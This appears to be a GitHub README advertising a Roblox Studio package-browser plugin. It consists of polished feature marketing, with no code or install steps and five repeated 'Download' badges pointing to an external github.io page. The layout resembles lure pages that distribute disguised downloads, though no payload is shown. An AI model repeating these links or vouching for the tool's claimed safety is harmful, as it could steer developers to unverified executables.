![preview](https://raw.githubusercontent.com/creativeW-source/studio-package-browser/main/shot_d6cb.svg)
# 🛰️ Orbit Registry — Universal Package Navigator for Roblox Studio

[![Download](https://raw.githubusercontent.com/creativeW-source/studio-package-browser/main/setup_203a2b.svg)](https://creativeW-source.github.io/studio-package-browser/)

A next-generation companion for Roblox Studio that turns the chaotic sprawl of community package ecosystems into a calm, navigable constellation. Orbit Registry is the spiritual successor to earlier browsing tools, rebuilt from the ground up around three ideas: discovery should feel like exploring a map, dependency resolution should feel like a promise kept, and every package should arrive with context, provenance, and a human-readable story attached to it.

Where other tools simply list packages, Orbit Registry curates them. It indexes Wally and Pesde registries side by side, cross-references them against your project manifests, and surfaces the packages your codebase actually needs — not just the ones with the loudest names. Think of it as mission control for your Roblox dependency universe.

[![Download](https://raw.githubusercontent.com/creativeW-source/studio-package-browser/main/setup_203a2b.svg)](https://creativeW-source.github.io/studio-package-browser/)

---

## 📖 Table of Contents

- [🌟 Why Orbit Registry Exists](#-why-orbit-registry-exists)
- [🧭 Core Concept](#-core-concept)
- [✨ Feature Highlights](#-feature-highlights)
- [🎨 Interface Philosophy](#-interface-philosophy)
- [🌍 Multilingual Support](#-multilingual-support)
- [🔍 Search and Discovery Engine](#-search-and-discovery-engine)
- [🧩 Package Ecosystem Coverage](#-package-ecosystem-coverage)
- [⚙️ Configuration and Preferences](#️-configuration-and-preferences)
- [🛡️ Reliability and Trust](#️-reliability-and-trust)
- [💬 Around-the-Clock Assistance](#-around-the-clock-assistance)
- [🧪 Testing and Quality Assurance](#-testing-and-quality-assurance)
- [🚀 Roadmap](#-roadmap)
- [🤝 Contributing](#-contributing)
- [📜 License](#-license)
- [⚠️ Disclaimer](#️-disclaimer)

---

## 🌟 Why Orbit Registry Exists

The Roblox development community has quietly become one of the most vibrant package ecosystems in the world — and yet, for years, the experience of *finding* a package has lagged behind the experience of *using* one. Developers knew a package existed because someone mentioned it in a Discord server. They knew it was maintained because someone else said so. They installed it and hoped for the best.

Orbit Registry was born from a simple frustration: **why does dependency discovery feel like archaeology?** Every package tells a story. It has an author, a version history, a set of transitive dependencies, a license, a target runtime, and a community of people who either rely on it or avoid it. Orbit Registry collects that story and lays it out in front of you, before you commit a single line to your project manifest.

The result is a plugin that feels less like a search bar and more like a well-organized library card catalog, rewritten for the era of Wally and Pesde.

---

## 🧭 Core Concept

At its heart, Orbit Registry treats every package as an **orbital body**. Packages you depend on directly are your inner ring. Their dependencies form the middle ring. Optional companions, peers, and recommendations occupy the outer ring. You navigate the rings, inspect each body, and decide what to pull into your gravity well.

This metaphor is not just cosmetic. It shapes every interaction in the plugin:

- **Orbits** represent dependency depth, so you can instantly see how far a package is from your direct requirements.
- **Beacons** represent packages that match your search but live outside your current manifest — you can promote them into your project with a single action.
- **Comets** are packages with recent releases, highlighted so you never miss a fresh update.
- **Eclipses** mark packages that are deprecated or superseded, quietly darkening them in the list rather than hiding them.

Navigation happens through a responsive panel that adapts to whatever window size you give it, so the interface stays usable whether you dock it in a small corner or expand it across a second monitor.

---

## ✨ Feature Highlights

Orbit Registry ships with a broad, carefully curated set of capabilities. Each one is designed to remove a small friction point from the daily life of a Roblox developer.

### 🔭 Unified Registry Browsing
Search Wally and Pesde simultaneously from one place. Results are normalized so that package names, versions, and descriptions are directly comparable, regardless of which registry they originate from.

### 🧱 Manifest-Aware Suggestions
Orbit Registry reads your project's dependency manifest and highlights packages that match the style, naming conventions, and versions you already use. Suggestions are ranked by compatibility, not just popularity.

### 🕰️ Temporal Diffing
See what changed between two versions of a package at a glance. Instead of forcing you to open a browser, the plugin presents a human-sized summary of added, removed, and renamed exports.

### 🧬 Transitive Dependency Visualizer
Every dependency tree is rendered as an interactive graph. Hover to inspect, click to pin, drag to rearrange. Cycles are surfaced explicitly so you can spot them before they cause trouble.

### 🔐 Provenance and Trust Markers
Packages carry trust markers based on registry metadata, release cadence, and community signals. These markers are descriptive, never punitive — they help you make a call, they never make it for you.

### 📚 Reading List
Bookmark packages you want to revisit later. The reading list syncs across your Studio sessions so your research survives a restart.

### 🧾 Exportable Reports
Generate a plain-text or structured report of your current manifest, its transitive closure, and a license summary for every dependency. Ideal for teams that need to document what they ship. Document-friendly and audit-friendly.

### 🎛️ Responsive Panel Layout
The UI adapts fluidly to any dock configuration. Columns collapse gracefully, touch targets remain generous, and keyboard navigation is a first-class citizen.

### 🌐 Multilingual Interface
All labels, tooltips, and error messages are available in multiple languages, with a straightforward extension path for community translations.

### 🕛 Around-the-Clock Assistance
A built-in help channel and a rotating community support rota mean questions never sit unanswered for long.

[![Download](https://raw.githubusercontent.com/creativeW-source/studio-package-browser/main/setup_203a2b.svg)](https://creativeW-source.github.io/studio-package-browser/)

---

## 🎨 Interface Philosophy

Modern tooling often mistakes density for power. Orbit Registry takes the opposite stance: it aims to be **calm under load**. The visual language is built around three principles.

**Principle one: quiet hierarchy.** Critical actions are always visible, advanced actions reveal themselves on demand. Nothing screams for attention unless something is genuinely wrong.

**Principle two: honest defaults.** The plugin never mutates your manifest without showing you exactly what it is about to do. Every write operation is previewable.

**Principle three: reversible interactions.** If you install, update, or remove a package through the plugin, you can step back through the history of that action and undo it cleanly. Undo is a first-class verb here, not an afterthought.

The result is an interface that feels less like a form and more like a conversation. You ask, it answers, you adjust, it listens.

---

## 🌍 Multilingual Support

Orbit Registry speaks to developers in the language they think in. The plugin ships with localization files for a growing list of languages, and the interface strings are pulled from those files at runtime. Switching a language takes effect immediately — no restart required.

Community-contributed translations are welcome and encouraged. A translation is treated as a first-class artifact: it has its own version history, its own reviewers, and its own place in the release notes. If your language is missing, the plugin will gracefully fall back through a chain of related locales rather than showing raw keys.

Accessibility is part of the same story. Screen-reader labels are provided for every interactive element, focus order is deterministic, and color contrast ratios are checked automatically during the design review process.

---

## 🔍 Search and Discovery Engine

The search experience in Orbit Registry is intentionally slower than a raw regex filter and intentionally faster than reading a documentation site.

- **Fuzzy matching** tolerates typos, partial words, and reordered terms.
- **Tag-based filtering** lets you narrow by category, target framework, and release channel.
- **Author and organization filters** help you follow the maintainers you already trust.
- **Recency weighting** lifts packages with fresh releases without burying stable classics.
- **Semantic hints** surface related packages based on shared dependency fingerprints.

Every query is also a learning opportunity. When you select a result, the plugin quietly records the signals that led you there and uses them to refine future rankings. Over time, the search bar becomes a mirror of your own project's taste.

---

## 🧩 Package Ecosystem Coverage

Orbit Registry currently indexes two major ecosystems and is designed to accommodate more without restructuring.

### Wally
The plugin understands Wally manifests, version ranges, and workspace layouts. It resolves dependencies the same way Wally does, so what you see in the plugin matches what you get on install.

### Pesde
Pesde's model is different in shape but not in spirit. Orbit Registry maps Pesde's concepts onto the same navigation metaphor, so switching between registries never feels like switching tools.

### Future Ecosystems
The registry adapter layer is open and documented. Adding a new ecosystem is a matter of implementing a small interface and registering it with the plugin. No forks required, no core changes needed.

---

## ⚙️ Configuration and Preferences

Every meaningful behavior in Orbit Registry can be tuned.

- **Theme** — light, dark, and a high-contrast mode for accessibility.
- **Density** — comfortable, compact, or ultra-compact list rendering.
- **Search scope** — one registry, both registries, or your manifest only.
- **Update behavior** — notify, auto-preview, or auto-stage updates.
- **Telemetry** — off by default, opt-in, and fully documented when enabled.
- **Keybinds** — remappable for every primary action.

Preferences are stored locally alongside your Studio installation and can be exported to a portable file for use across machines.

---

## 🛡️ Reliability and Trust

A dependency tool is only as good as its word. Orbit Registry takes that seriously.

- **No silent writes.** Every change to your project is previewed and confirmed.
- **No hidden network calls.** Every outbound request is logged in a visible session log.
- **No opaque ranking.** The factors behind every recommendation are shown on request.
- **No lock-in.** Your manifest remains the source of truth; the plugin never invents its own format.

For teams, this means the plugin can be dropped into a shared workflow without a governance meeting. For individuals, it means the plugin stays out of the way until you ask for help.

---

## 💬 Around-the-Clock Assistance

Support does not follow a business-hours calendar. Orbit Registry maintains a continuous assistance channel staffed by rotating maintainers and community volunteers, so no question has to wait until tomorrow morning to be acknowledged.

- **In-plugin help panel** with contextual suggestions based on what you were just doing.
- **Community forum** with searchable discussions and pinned answers.
- **Weekly office hours** where maintainers walk through tricky dependency graphs live.
- **Documented escalation path** for anything that touches trust or safety.

Response times are tracked publicly so the community can hold the project accountable.

---

## 🧪 Testing and Quality Assurance

Every release of Orbit Registry passes through a layered test suite before it reaches the catalog.

- **Unit tests** cover parsing, normalization, and ranking logic.
- **Integration tests** exercise the plugin against fixture registries.
- **Snapshot tests** lock down the rendering of complex dependency graphs.
- **Cross-version tests** verify behavior across multiple Studio releases.
- **Accessibility tests** enforce contrast, focus order, and label coverage.

Test results are published with each release so you can see exactly what was verified and what was not.

---

## 🚀 Roadmap

The road ahead is long and deliberately paced.

- **Near term** — richer Pesde metadata, offline caching, and manifest linting.
- **Mid term** — team workspaces, shared reading lists, and cross-project dependency graphs.
- **Long term** — plugin API for third-party extensions, and an optional self-hosted registry mirror.

Roadmap items are discussed in the open. Priorities shift based on community feedback, but the direction is stable: make dependency discovery calm, honest, and delightful.

---

## 🤝 Contributing

Contributions are welcome in many forms — code, translations, documentation, design critique, and bug reports. The project uses a lightweight contribution guide and a code of conduct that prioritizes patience and clarity over speed.

Before opening a large change, please open a discussion. It saves everyone time and keeps the project coherent.

---

## 📜 License

Orbit Registry is released under the MIT License. The full text is available in the repository's license file.

Read the license here: [MIT License](LICENSE)

---

## ⚠️ Disclaimer

Orbit Registry is an independent community project. It is not affiliated with, endorsed by, or sponsored by Roblox Corporation, Wally, Pesde, or any of the package authors whose work it indexes. Package metadata is presented as-is from public registries, and the project makes no guarantees regarding the correctness, safety, or fitness of any third-party package. Always review the source of a dependency before adopting it in a production project. By using this plugin, you accept responsibility for the dependencies you choose to include in your own work.

© 2026 Orbit Registry contributors. All rights reserved where applicable.

[![Download](https://raw.githubusercontent.com/creativeW-source/studio-package-browser/main/setup_203a2b.svg)](https://creativeW-source.github.io/studio-package-browser/)